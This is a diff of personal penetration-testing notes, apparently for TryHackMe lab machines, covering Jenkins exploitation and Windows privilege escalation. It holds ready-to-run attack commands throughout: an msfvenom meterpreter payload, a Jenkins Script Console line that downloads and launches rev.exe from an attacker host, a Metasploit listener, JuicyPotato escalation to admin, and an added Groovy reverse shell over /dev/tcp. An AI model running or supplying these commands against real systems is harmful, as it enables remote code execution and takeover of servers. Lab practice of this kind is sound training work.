@@ -6,6 +6,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 
 
 In Jenkins Script Console:
 println "powershell (New-Object System.Net.WebClient).Downloadfile('http://10.13.14.242:8080/rev.exe','rev.exe')".execute().text
+
 Kali: use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run
 Jenkins script console: println "powershell Start-Process 'rev.exe'".execute().text
 msf6 exploit(multi/handler) > run
@@ -39,9 +40,19 @@ JuicyPotato.exe -l 1337 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" -p rev.exe -
 
 This gives admin privilege shell. 
 
-
 gobuster dir -u http://10.10.4.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,html -t 60 -o scans.txt
 
+For port redireciton using ssh, accesing port inside firewall.
+ssh -L 8090:172.17.0.2:8080  aubreanna@internal.thm
+In attacker machine, you can use localhost:8090
+
+Jenkins for unix based system:
+Command in Jenkins Script Console:
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.13.14.242/4546;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+To get the reverse shell. 
 
 
 
